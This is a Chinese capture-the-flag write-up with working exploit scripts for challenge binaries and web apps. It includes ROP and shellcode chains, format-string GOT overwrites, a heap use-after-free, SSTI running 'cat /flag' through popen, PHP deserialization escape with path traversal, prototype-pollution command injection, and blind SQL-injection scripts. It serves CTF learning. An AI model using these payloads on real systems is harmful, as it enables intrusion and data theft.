0x01 Reverse
============

comeongo
--------

前面是base58 后面是base64 最后需要爆破

```php
k2 = b"gG00"
c = [  0xDD, 0x8F, 0xA1, 0x64]
k = [0x76,0x47,0x67,0x47]

for i in range(32,127-62):
    for j in range(32,127-30):
        v1 = i+63
        v2 = j+31
        c1 = 2+ v1 +i
        c2 = 3+ v2 +j
        if(c1&0xff == c[2] and c2&0xff == c[3]):
            print(chr(i),chr(j),chr(i+63),chr(j+31))

```

flag{GoM0bi13\_BingGo@G3tItEzForRevG0!}

6470d669e15349795c646c9549ab2f98

0x02 PWN
========

bfbf
----

数组下标溢出，单字节leak和修改，沙箱按道理是只限制了read的fd为0和1

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-71c91885b8ab8943973cba95bd3683fd98323408.png)

现在有个小问题是system不知道为什么get不了shell，orw尝试close(1)然后开flag的文件描述符到1来读read(1,addr,0x50)也读不进目标地址，有点问题......

更新：

open不能用open64，现在mprotect一个elf上的rwx权限走普通open就能orw

目前的exp：

```php
from pwn import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

mode = 0
if mode == 1:
    p = process("./pwn")  
else:
    p = remote("ip",port)

def debug():
    gdb.attach(p)
    pause()

# libc = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
libc = ELF("./libc.so.6")

# gdb.attach(p,'b *(0x555555554000 + 0x1955 )')
# pause()

p.recvuntil("BF_PARSER>>\n")
payload = '>' * (0x218) + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '<' * 5

payload += '>' * (0x20) + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '>' + '.'
payload += '<' * 5

# read /flag
for i in range(6):
    # pop rdi + args
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
# read
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'

# close 1
for i in range(2):
    # pop rdi + args
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
# close
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'

# mprotect
# pop args
for i in range(6):
    # pop rdi + args
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
    payload += ',' + '>'
# mprotect
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'

# ret addr
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'
payload += ',' + '>'

p.send(payload)

libc_addr = 0
elf_addr = 0

# leak elf
for i in range(6):
    # pause()
    sleep(0.1)
    lowbit = u64(p.recv(1).ljust(8,b'\x00'))
    elf_addr = elf_addr + ( lowbit << ( i * 8 ) )
    log.info("elf_addr : 0x%x" % elf_addr)

elf_base = elf_addr - 0x1955
bss_addr = elf_base + 0x4000
log.info("elf_base : 0x%x" % elf_base)

# leak
for i in range(6):
    # pause()
    sleep(0.1)
    lowbit = u64(p.recv(1).ljust(8,b'\x00'))
    libc_addr = libc_addr + ( lowbit << ( i * 8 ) )
    log.info("libc_addr : 0x%x" % libc_addr)

libc_base = libc_addr - 243 - libc.symbols['__libc_start_main']
log.info("libc_base : 0x%x" % libc_base)

pop_r12_ret = libc_base + 0x000000000002f709 # : pop r12 ; ret 
pop_rdi_ret = libc_base + 0x0000000000023b6a # : pop rdi ; ret
pop_rsi_ret = libc_base + 0x000000000002601f # : pop rsi ; ret
pop_rdx_ret = libc_base + 0x0000000000142c92 # : pop rdx ; ret
ret = libc_base + 0x0000000000022679 # : ret

bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
system_addr = libc_base + libc.symbols['system']
read_addr = libc_base + libc.symbols['read']
write_addr = libc_base + libc.symbols['write']
open_addr = libc_base + libc.symbols['open']
close_addr = libc_base + libc.symbols['close']
mprotect_addr = libc_base + libc.symbols['mprotect']
log.info("bin_sh_addr : 0x%x" % bin_sh_addr)
log.info("system_addr : 0x%x" % system_addr)

# mprotect
# pop rdi
sleep(0.1)
p.send(p64(pop_rdi_ret))
# addr
sleep(0.1)
p.send(p64(bss_addr))
# pop rsi
sleep(0.1)
p.send(p64(pop_rsi_ret))
# prot
sleep(0.1)
p.send(p64(0x1000))
# pop rdx
sleep(0.1)
p.send(p64(pop_rdx_ret))
# len
sleep(0.1)
p.send(p64(7))
sleep(0.1)
p.send(p64(mprotect_addr))

# read
# pop rdi
sleep(0.1)
p.send(p64(pop_rdi_ret))
# 0
sleep(0.1)
p.send(p64(0))
# pop rsi
sleep(0.1)
p.send(p64(pop_rsi_ret))
# target addr
sleep(0.1)
p.send(p64(bss_addr))
# pop rdx
sleep(0.1)
p.send(p64(pop_rdx_ret))
# len
sleep(0.1)
p.send(p64(0x300))
sleep(0.1)
p.send(p64(read_addr))

# close
# pop rdi
sleep(0.1)
p.send(p64(pop_rdi_ret))
# 1
sleep(0.1)
p.send(p64(1))
sleep(0.1)
p.send(p64(close_addr))

sleep(0.1)
p.send(p64(bss_addr))

# pause()
sleep(0.2)
payload  = asm(shellcraft.open("/flag\x00"))
payload += asm(shellcraft.read(1,bss_addr + 0x500,0x50))
payload += asm(shellcraft.write(2,bss_addr + 0x500,0x50))

p.send(payload)

p.interactive()

```

写one gadget也不得，不知道为什么，本地gdb调试的界面显示执行了/bin/dash，但是终端哪里寄了，远程显示timeout。看起来好像是execve被ban了，但是沙箱没有写。

```php
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn2'
elf=ELF('./'+filename)
libc=ELF('./libc.so.6')
p=process('./'+filename)
#p=remote('172.51.63.218',9999)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

ru("BF_PARSER>>\n")

# payload='>'*0x240+'.>'*0x8+'>'*0x20+'.>'*0x8
# s(payload)
# data1=uu64(r(8))
# leak("data",hex(data1))
# data2=uu64(r(8))
# leak("data",hex(data2))

#leak
payload='>'*0x240+'.>'*0x8
payload+='<'*0x10+',>'*0x20
s(payload)
# elfbase=uu64(r(8))-0x1955
# leak("elfbase",hex(elfbase))

sleep(0.4)
libcbase=uu64(r(8))-0x221620
leak("libcbase",hex(libcbase))

#debug()
#overwrite ret

pop_r12=libcbase+0x2f709 #9.8
#pop_r12=libcbase+0x2f739
one_gadget=libcbase+0xe3afe #9.8
#one_gadget=libcbase+0xe3b2e
ret=libcbase+0x22679
leak("pop r12",hex(pop_r12))
leak("one gadget",hex(one_gadget))
payload=p64(ret)+p64(pop_r12)+p64(0)+p64(one_gadget)
for i in range(len(payload)):
  s(payload[i])
# sl("cat flag")
itr()

# 0xe3afe execve("/bin/sh", r15, r12)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [r12] == NULL || r12 == NULL

# 0xe3b01 execve("/bin/sh", r15, rdx)
# constraints:
#   [r15] == NULL || r15 == NULL
#   [rdx] == NULL || rdx == NULL

# 0xe3b04 execve("/bin/sh", rsi, rdx)
# constraints:
#   [rsi] == NULL || rsi == NULL
#   [rdx] == NULL || rdx == NULL

```

0x03 mimc
=========

pwn1
----

格式化字符串写print got

```php
from pwn import *
from LibcSearcher import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

mode = 0
if mode == 1:
    p = process("./pwn1")  
else:
    p = remote("ip",port)

def debug():
    gdb.attach(p)
    pause()

# gdb.attach(p,'b *(0x555555400000 + 0xAE9 )')
# pause()

p.recvuntil("Welcome to mimic world,try something\n")
p.sendline(str(1))
p.recvuntil("You will find some tricks\n")
p.recvuntil("0x")
elf_addr = int(p.recv(12),16)
elf_base = elf_addr - 0xa94
get_shell = elf_base + 0xA2c
system_plt = elf_base + 0x870
system_got = elf_base + 0x202030
printf_got = elf_base + 0x202038
sleep(0.5)
p.sendline(str(2))
p.recvuntil("hello\n")

addr6 = (system_plt >> 8 * 5) & 0xff
addr5 = (system_plt >> 8 * 4) & 0xff
addr4 = (system_plt >> 8 * 3) & 0xff
addr3 = (system_plt >> 8 * 2) & 0xff
addr2 = (system_plt >> 8 * 1) & 0xff
addr1 = (system_plt >> 8 * 0) & 0xff

log.info("addr1 : 0x%x" % addr1)
log.info("addr2 : 0x%x" % addr2)
log.info("addr3 : 0x%x" % addr3)
log.info("addr4 : 0x%x" % addr4)
log.info("addr5 : 0x%x" % addr5)
log.info("addr6 : 0x%x" % addr6)

# addr6
payload = "%" + str(addr6) + "c%18$hhn"

# addr5
if addr5 > addr6:
    payload += "%" +str(addr5 - addr6) + "c%19$hhn"
else:
    payload += "%" +str( 0x100 + addr5 - addr6) + "c%19$hhn"

# addr4
if addr4 > addr5:
    payload += "%" +str(addr4 - addr5) + "c%20$hhn"
else:
    payload += "%" +str( 0x100 + addr4 - addr5) + "c%20$hhn"

# addr3
if addr3 > addr4:
    payload += "%" +str(addr3 - addr4) + "c%21$hhn"
else:
    payload += "%" +str( 0x100 + addr3 - addr4) + "c%21$hhn"

# addr2
if addr2 > addr3:
    payload += "%" +str(addr2 - addr3) + "c%22$hhn"
else:
    payload += "%" +str( 0x100 + addr2 - addr3) + "c%22$hhn"

# addr1
if addr1 > addr2:
    payload += "%" +str(addr1 - addr2) + "c%23$hhn"
else:
    payload += "%" +str( 0x100 + addr1 - addr2) + "c%23$hhn"

log.info("printf_got : 0x%x" % printf_got)
print("len of payload now : " + str(hex(len(payload))))

payload = payload.ljust(0x50, 'a')
payload += p64(printf_got + 5).decode('unicode_escape') 
payload += p64(printf_got + 4).decode('unicode_escape') 
payload += p64(printf_got + 3).decode('unicode_escape') 
payload += p64(printf_got + 2).decode('unicode_escape') 
payload += p64(printf_got + 1).decode('unicode_escape') 
payload += p64(printf_got).decode('unicode_escape')

sleep(0.5)
p.send(payload)

log.info("elf_addr : 0x%x" % elf_addr)
log.info("elf_base : 0x%x" % elf_base)
log.info("system_plt : 0x%x" % system_plt)

sleep(0.1)
payload = '/bin/sh\x00'
p.send(payload)
# debug()

p.interactive()

```

pwn1-1
------

pwn1原题ctf，改一下参数直接通

```php
from pwn import *
from LibcSearcher import *
context(os = 'linux',arch = 'amd64',log_level = 'debug')

mode = 0
if mode == 1:
    fang = process("./pwn1_1")  
else:
    fang = remote("172.51.61.218",9999)

def debug():
    gdb.attach(fang)
    pause()

# gdb.attach(fang,'b *(0x555555400000 + 0x1547 )')
# pause()

fang.recvuntil("Welcome to mimic world,try something\n")
fang.sendline(str(1))
fang.recvuntil("You will find some tricks\n")
fang.recvuntil("0x")
elf_addr = int(fang.recv(12),16)
elf_base = elf_addr - 0x12a0
system_plt = elf_base + 0x1040
printf_got = elf_base + 0x4028
log.info("elf_base : 0x%x" % elf_base)
log.info("system_plt : 0x%x" % system_plt)
log.info("printf_got : 0x%x" % printf_got)

sleep(0.5)
fang.sendline(str(2))
fang.recvuntil("hello\n")

addr6 = (system_plt >> 8 * 5) & 0xff
addr5 = (system_plt >> 8 * 4) & 0xff
addr4 = (system_plt >> 8 * 3) & 0xff
addr3 = (system_plt >> 8 * 2) & 0xff
addr2 = (system_plt >> 8 * 1) & 0xff
addr1 = (system_plt >> 8 * 0) & 0xff

log.info("addr1 : 0x%x" % addr1)
log.info("addr2 : 0x%x" % addr2)
log.info("addr3 : 0x%x" % addr3)
log.info("addr4 : 0x%x" % addr4)
log.info("addr5 : 0x%x" % addr5)
log.info("addr6 : 0x%x" % addr6)

# addr6
payload = "%" + str(addr6) + "c%18$hhn"

# addr5
if addr5 > addr6:
    payload += "%" +str(addr5 - addr6) + "c%19$hhn"
else:
    payload += "%" +str( 0x100 + addr5 - addr6) + "c%19$hhn"

# addr4
if addr4 > addr5:
    payload += "%" +str(addr4 - addr5) + "c%20$hhn"
else:
    payload += "%" +str( 0x100 + addr4 - addr5) + "c%20$hhn"

# addr3
if addr3 > addr4:
    payload += "%" +str(addr3 - addr4) + "c%21$hhn"
else:
    payload += "%" +str( 0x100 + addr3 - addr4) + "c%21$hhn"

# addr2
if addr2 > addr3:
    payload += "%" +str(addr2 - addr3) + "c%22$hhn"
else:
    payload += "%" +str( 0x100 + addr2 - addr3) + "c%22$hhn"

# addr1
if addr1 > addr2:
    payload += "%" +str(addr1 - addr2) + "c%23$hhn"
else:
    payload += "%" +str( 0x100 + addr1 - addr2) + "c%23$hhn"

log.info("printf_got : 0x%x" % printf_got)
print("len of payload now : " + str(hex(len(payload))))

payload = payload.ljust(0x50, 'a')
payload += p64(printf_got + 5).decode('unicode_escape') 
payload += p64(printf_got + 4).decode('unicode_escape') 
payload += p64(printf_got + 3).decode('unicode_escape') 
payload += p64(printf_got + 2).decode('unicode_escape') 
payload += p64(printf_got + 1).decode('unicode_escape') 
payload += p64(printf_got).decode('unicode_escape')

sleep(0.5)
fang.send(payload)

log.info("elf_addr : 0x%x" % elf_addr)
log.info("elf_base : 0x%x" % elf_base)
log.info("system_plt : 0x%x" % system_plt)

pause()
payload = '/bin/sh\x00'
fang.send(payload)
# debug()

fang.interactive()

```

pwn2-1
------

简单的堆，UAF加上一点风水，把函数指针改成后门magic()。

```php
struct note
{
    _QWORD* ptr=&print_note_content;
    _QWORD* content=malloc(size);
}
```

```php
from pwn import*
context(log_level='debug',os='linux',arch='amd64')
filename='pwn2'
elf=ELF('./'+filename)
#libc=ELF('')
#p=process('./'+filename)
p=remote('',9999)

s       = lambda data               :p.send(data)
sl      = lambda data               :p.sendline(data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda num=4096           :p.recvline(num)
ru      = lambda x                  :p.recvuntil(x)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\x00'))
uu64    = lambda data               :u64(data.ljust(8,'\x00'))
leak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))

def debug(cmd='\n'):
  gdb.attach(p,cmd)
  pause()

def add(size,content):
  ru("Your choice :")
  sl('1')
  ru("Note size :")
  sl(str(size))
  ru("Content :")
  s(content)

def delete(idx):
  ru("Your choice :")
  sl('2')
  ru("Index :")
  sl(str(idx))

def show(idx):  
  ru("Your choice :")
  sl('3')
  ru("Index :")
  sl(str(idx))

#get tips
ru("Your choice :")
sl('5')
ru("let us give you some tips\n")
elfbase=int(ru('\n')[2:-1],16)-0x11f0
leak("elf base",hex(elfbase))
backdoor=elfbase+0x1b70

#debug()

#can double free

add(0x10,'a'*0x8)#0
add(0x10,'b'*0x8)#1
add(0x10,'c'*0x8)#2

delete(0)
delete(1)

#1h->1c->0h->0c

add(0x20,'d'*0x8)#3
add(0x10,p64(backdoor))#4

#3=1h->new
#4=1c->0h

#debug()
show(0)

itr()

```

web-mimc
--------

```php
<!--
     NTLM:3dbde697d71690a769204beb12283678
     encrypt word:c81f6e7cfb6968ba5b8d1f1b6cc76bbe9f8105375c227952723fd98478af78cf8aca554158b6d943c984681049be1a1368b2331cbe151ae1bce049f893bfbafebe6b6c5cf2d2d8136caec5f7171f00afd77c73de693878e0adebb72c6b0c2f5ff6a339616e87e1275e06a8f0d7faa0ff04ce1c5f1403500f17bf1ae06e2d6417ffbe262270c6370a764de313fcc33ba0081dd631d31a3b876a5478545021b839
-->
```

NTLM hash

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-1a50a528ce34f01ef621358b630b4e5bc5999f2d.png)

```php
#des decrypt

def des_Decrypt(key,data):
    from Crypto.Cipher import DES

    des = DES.new(key, DES.MODE_ECB, )
    text = des.decrypt(data)
    return text

c = bytes.fromhex("c81f6e7cfb6968ba5b8d1f1b6cc76bbe9f8105375c227952723fd98478af78cf8aca554158b6d943c984681049be1a1368b2331cbe151ae1bce049f893bfbafebe6b6c5cf2d2d8136caec5f7171f00afd77c73de693878e0adebb72c6b0c2f5ff6a339616e87e1275e06a8f0d7faa0ff04ce1c5f1403500f17bf1ae06e2d6417ffbe262270c6370a764de313fcc33ba0081dd631d31a3b876a5478545021b839")

k = bytes.fromhex("3dbde697d71690a769204beb12283678")

k = b"123\x00\x00\x00\x00\x00"

print(des_Decrypt(k,c))

```

解密得：

```php
1.maybe used first url get random:
/mimic_storage

2.maybe used second url get flag:
/getflag?sec=random&path=xxxx

xxx is:
bAzlsD1ChiFW5eMC5tUokHErPkdjqARE

```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-ec33e9452d7989e2c350c2696abbe98aa17f0064.png)

0x04 Web
========

EZpy
----

存在模板注入

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-097f1da61599bbc1df00f1baa46d7bcba68ade26.png)

大小写转换，存在unicode绕过，直接shift+空格快速开启全角和半角的转换，使用unicode绕过，找到132的位置是os.\_\_wrap\_\_close ，然后把正常payload换成全角即可，也可以使用下面的脚本生成字符：

```php
().__ᶜˡᵃˢˢ__.__ᵇᵃˢᵉˢ__[0].__ˢᵘᵇᶜˡᵃˢˢᵉˢ__()
编码生成
import zhconv
from unicodedata import normalize

for i in range(1,50000):
    a=zhconv.convert(normalize('NFKD', chr(i)), 'zh-hant')
    if a in "a":
        print(chr(i))
```

```php
{{().__ᶜˡᵃˢˢ__.__ᵇᵃˢᵉˢ__[0].__ˢᵘᵇᶜˡᵃˢˢᵉˢ__()[213]}} #warnings.catch_warning

{{''.__ｃｌａｓｓ__.__ｂａｓｅｓ__[0].__ｓｕｂｃｌａｓｓｅｓ__()[132].__ｉｎｉｔ__.__ｇｌｏｂａｌｓ__['ｐｏｐｅｎ']('ｃａｔ　／ｆｌａｇ').ｒｅａｄ()}}
```

ezus
----

```php
<?php
include 'tm.php'; // Next step in tm.php
if (preg_match('/tm\.php\/*$/i', $_SERVER['PHP_SELF']))
{
    exit("no way!");
}
if (isset($_GET['source']))
{
    $path = basename($_SERVER['PHP_SELF']);
    if (!preg_match('/tm.php$/', $path) && !preg_match('/index.php$/', $path))
    {
        exit("nonono!");
    }
    highlight_file($path);
    exit();
}
?>
<a href="index.php?source">source</a>

```

部分知识点之前考过：<https://blog.csdn.net/mochu7777777/article/details/127216646>

```php
/index.php/tm.php/%88?source
```

拿到源码：

```php
<?php
class UserAccount
{
    protected $username;
    protected $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}

function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}

class order
{
    public $f;
    public $hint;

    public function __construct($hint, $f)
    {
        $this->f = $f;
        $this->hint = $hint;
    }

    public function __wakeup()
    {
        //something in hint.php
        if ($this->hint != "pass" || $this->f != "pass") {
            $this->hint = "pass";
            $this->f = "pass";
        }
    }

    public function __destruct()
    {
        if (filter_var($this->hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this->hint);
            if (!empty($this->f)) {
                if (strpos($this->f, "try") !==  false && strpos($this->f, "pass") !== false) {
                    @include($this->f . '.php');
                } else {
                    die("try again!");
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    @$out = file_get_contents($this->hint);
                    echo "<br/>".$out;
                } else {
                    die("<br/>error");
                }
            } else {
                die("try it!");
            }
        }
        else
        {
            echo "Invalid URL";
        }
    }
}

$username = $_POST['username'];
$password = $_POST['password'];

$user = serialize(new UserAccount($username, $password));
unserialize(object_weakup(object_sleep($user)))
?>

```

一看就是反序列化字符串逃逸：

现在本地测试，测试过程如下：

```php
<?php
class UserAccount
{
    protected $username;
    protected $password;

    public function __construct($username, $password)
    {
        $this->username = $username;
        $this->password = $password;
    }
}

class order
{
    public $f;
    public $hint;

    public function __construct($f, $hint)
    {
        $this->f = $f;
        $this->hint = $hint;
    }

//    public function __wakeup()
//    {
//        //something in hint.php
//        if ($this->hint != "pass" || $this->f != "pass") {
//            $this->hint = "pass";
//            $this->f = "pass";
//        }
//    }

    public function __destruct()
    {
        if (filter_var($this->hint, FILTER_VALIDATE_URL))
        {
            $r = parse_url($this->hint);
            if (!empty($this->f)) {
                if (strpos($this->f, "try") !==  false && strpos($this->f, "pass") !== false) {
                    @include($this->f . '.php');
                } else {
                    die("try again!");
                }
                if (preg_match('/prankhub$/', $r['host'])) {
                    @$out = file_get_contents($this->hint);
                    echo "<br/>".$out;
                } else {
                    die("<br/>error");
                }
            } else {
                die("try it!");
            }
        }
        else
        {
            echo "Invalid URL";
        }
    }
}
function object_sleep($str)
{
    $ob = str_replace(chr(0).'*'.chr(0), '@0@0@0@', $str);
    return $ob;
}

function object_weakup($ob)
{
    $r = str_replace('@0@0@0@', chr(0).'*'.chr(0), $ob);
    return $r;
}
//echo urlencode(serialize(new order("trypass","mochu7://prankhub/../../../../../../../etc/passwd")))."\n";
echo serialize(new order("trypass","mochu7://prankhub/../../../../../../../f1111444449999.txt"))."\n";
//$username=serialize(new order("trypass","mochu7://prankhub/../../../../../../../etc/passwd"));
$username="@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@";
//echo $username."\n";
//$password="1231231231231\";s:11:\"\x00*\x00password\";s:16:\"1231231231231\";}";
//$password="123123123123\";s:11:\"\x00*\x00password\";O:5:\"order\":2:{s:1:\"f\";s:44:\"a://prankhub/../../../../../../../etc/passwd\";s:4:\"hint\";s:7:\"trypass\";}}";
//$password="123123123123\";s:11:\"\x00*\x00password\";O:5:\"order\":2:{s:1:\"f\";s:7:\"trypass\";s:4:\"hint\";s:49:\"v1nd11://prankhub/../../../../../../../etc/passwd\";}}";
//$password="123123123123\";s:11:\"\x00*\x00password\";O:5:\"order\":2:{s:1:\"f\";s:7:\"trypass\";s:4:\"hint\";s:60:\"v1nd11://prankhub/../../../../../../../var/www/html/hint.php\";}}";
$password="123123123123\";s:11:\"\x00*\x00password\";O:5:\"order\":2:{s:1:\"f\";s:7:\"trypass\";s:4:\"hint\";s:57:\"v1nd11://prankhub/../../../../../../../f1111444449999.txt\";}}";
$user = serialize(new UserAccount($username, $password));
echo $user."\n";
$huan=object_weakup(object_sleep($user));
echo $huan."\n";

$u="123";
$p=new order("123","123");
echo serialize(new UserAccount($u,$p))."\n";

$user=unserialize(object_weakup(object_sleep($user)));
var_dump($user);

$test=object_sleep(object_weakup("@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@"));
//echo $test."\n";

//username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&password=11";s:3:"123";s:11:"%00*%00password";O:5:"order":3:{s:1:"f";s:70:"php://filter/read=convert.base64-encode/resource=./try/pass/../../hint";s:4:"hint";s:50:"a://@prankhub/../../../../../../f1111444449999.txt";}}

```

最终payload：

```php
username=@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@@0@0@0@&password=123123123123";s:11:"%00*%00password";O:5:"order":3:{s:1:"f";s:7:"trypass";s:4:"hint";s:57:"v1nd11://prankhub/../../../../../../../f1111444449999.txt";}}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-52b87d8ded3c6de7594c966fc84353a230e4d1d7.png)

WHOYOUARE
---------

关键源码：

user.js

```php
const merge = require('../utils/merge')
const bin = "/bin/bash"
const ChildProcess = require('child_process');

function checkUser(command){
    if (Array.isArray(command) === false || command.length > 2) {
        return false;
    }
    for (let i = 0; i < command.length; i++) {
        let cmd = command[i];
        console.log("R: "+RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i]));
        console.log("cmd: "+cmd);
        if (typeof cmd !== 'string' || cmd.length > 4 || RegExp(/^[^a-zA-Z0-9-]+$/).test(command[i])) {
            return false;
        }
    }
    console.log("true");
    return true;
}

async function routes (fastify, options) {
    fastify.route(
        {
            method: 'POST',
            url: '/user',
            schema: {
                querystring: {
                    user: { type: 'string' },
                },
                additionalProperties: false,
                response: {
                    200: {
                        $ref: 'respWrapper#/response/success'
                    }
                }
            },
            preHandler: function (request, reply, done) {
                //user init
                request.user = {username : 'guest', command: ["-c", "id"]}
                let user = JSON.parse(request.body.user)
                // clean user command
                if (checkUser(user.command) !== true) {
                    user.command = ["-c", "id"]
                }
                try {
                    merge(request.user, user)
                }catch (e){
                    reply.code(400).send({status: 1, info: "Something error"})
                    return ;
                }
                done()
            },

            handler : function (request, reply) {
                ChildProcess.execFile(bin, request.user.command, (error, stdout, stderr) => {
                    if (error) {
                        reply.code(400).send({status: 1, info: error})
                    }
                    reply.code(200).send({ status : 0 , info : `User of ${request.user.username} : ${stdout}`});
                });
            }
        })
    fastify.route({
        method: 'GET',
        url: '/',
        response: {
            $ref: 'respWrapper#/response/success'
        },
        handler: function (request, reply) {
            reply.send({ status: 0, info: 'go user' })
        }
    })
}

module.exports = routes
```

merge.js

```php
const whileTypes = ['boolean', 'string', 'number', 'bigint', 'symbol', 'undefined'];

const merge = (target, source) => {
    for (const key in source) {
        console.log("1");
        console.log("target: "+target[key]);
        console.log("source: "+source[key]);
        // console.log("type(target): "+typeof target[key]);
        if(!whileTypes.includes(typeof source[key]) && !whileTypes.includes(typeof target[key])){
            if(key !== '__proto__'){
                console.log("merge");
                merge(target[key], source[key]);

            }
        }else{
            console.log("else");
            target[key] = source[key];
        }
        console.log("2");
        console.log("target: "+target[key]);
        console.log("source: "+source[key]);
    }
}

module.exports = merge
```

默认只支持`application/json` and `text/plain`

可以传json，有长度限制，最多四

```php
{"user":"{\"command\":[\"-c\",\"env\"]}"}
```

存在原型链污染：

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-f24ee069ab131914c1ff8c4fc9a10c495c9cc4ae.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7595766dba68f4703312211d0123179a267ae376.png)

最终payload：

```php
{"user":"{\"constructor\":{\"prototype\":{\"1\":\"cat /f*\"}}}"}
{"user":"{\"command\":[\"-c\"]}"}
```

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-7031b4673814803fc5945b1654100bd0ad543ce7.png)

![image.png](https://shs3.b.qianxin.com/attack_forum/2022/11/attach-17acf83bc99b5d2d4f27aa05e3265fab83daf8c2.png)

popsql
------

开局登录框，测试过滤的字符如下：

```php
passwd 过滤了如下
regexp
between
like
=
<>
"
union
^
and
|
ascii
mid
left
in
update
extractvalue
substr
&
;
sleep
```

发现可以benchmark延时注入：

```php
#这种可以注入，相等时不会延迟，不相等就会延迟
username=admin&password='or/**/if(strcmp(right(database(),1),'q'),benchmark(3e6,sha1('v1nd')),3)#
```

查表名和列名：  
**绕过in的一个小trick：**  
**table：sys.schema\_table\_statistics**  
**column：sys.x$statement\_analysis**

```php
import string
import requests
import time
table_res=''
att=string.ascii_letters+string.digits+"}{_-.,"
url="http://172.51.61.114/index.php"
for i in range(1,99999999):
    for char in att:
        use = char + table_res
        data={
        "username":"admin",
        "password":f"'or/**/if(strcmp(right((select/**/group_concat(table_name)/**/from/**/sys.schema_table_statistics),{i}),'{use}'),3,benchmark(10000000,md5('123')))#"
        }
        try:
            res=requests.post(url=url,data=data,timeout=1.1)
        except:
            table_res=use
            print(i)
            print(table_res)
            time.sleep(1)
            break

```

```php
users,fl49ish3re
f1aG123
```

注出flag：

```php
import requests
import string
import time

url = 'http://172.51.61.114/index.php'
flag = ''
att=string.ascii_uppercase+string.ascii_lowercase+string.digits+"}{_-.,"

for i in range(1,80):
    for a in att:
        use=a+flag
        # payload="'or/**/if(strcmp(right((select/**/database()),{}),'{}'),benchmark(5e6,sha1('v1nd')),3)#".format(i,use)
        # payload="\'or/**/if(strcmp(right((select/**/\'a\'),{}),\'{}\'),benchmark(5e6,sha1(123)),3)#".format(i,use)
        # payload="'or/**/if(strcmp(right((select/**/database()),{}),'{}'),2,benchmark(5e6,sha1(123)))#".format(i,use)
        # payload="'or/**/if(strcmp(right((select/**/user()),{}),'{}'),2,benchmark(5e6,sha1(123)))#".format(i,use)
        # payload="'or/**/if(strcmp(right((select/**/version()),{}),'{}'),2,benchmark(5e6,sha1(123)))#".format(i,use)
        # payload="'or/**/if(strcmp(right((select/**/f1aG123/**/from/**/Fl49ish3re),{}),'{}'),2,benchmark(5e6,sha1(123)))#".format(i,use)
        payload="'or/**/if(strcmp(ord((right((select/**/f1aG123/**/from/**/Fl49ish3re),{}))),ord('{}')),2,benchmark(5e6,sha1(123)))#".format(i,use)
        data={
            "username":"admin",
            "password":payload
        }
        # print(payload)
        try:
            res=requests.post(url=url,data=data,timeout=1)

        except:
            flag=use
            print(flag)
            time.sleep(1)
            break
    # print(flag)
print(flag)
# localhost
# ctfgame
# users,fl49ish3re
# gaaaIaabbaay5.7.39
# RaaaaPLfhbftr1kxd4qudt}
